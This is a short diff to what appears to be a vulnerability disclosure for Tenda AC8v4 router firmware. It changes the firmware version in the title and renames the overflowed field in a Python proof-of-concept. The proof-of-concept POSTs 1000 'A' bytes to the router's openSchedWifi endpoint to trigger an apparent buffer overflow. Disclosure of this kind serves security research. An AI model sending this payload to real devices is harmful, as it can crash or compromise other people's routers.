@@ -1,4 +1,4 @@
-# Tenda AC8v4 V16.03.34.06
+# Tenda AC8v4 V16.03.34.06(1)
 
 ## Overview
 
@@ -25,7 +25,7 @@ import requests
 
 url = "http://192.168.1.100/goform/openSchedWifi"
 data = {
-        "schedEndTime":b'A'*1000
+        "schedStartTime":b'A'*1000
 }
 requests.post(url=url,data=data)
 ```
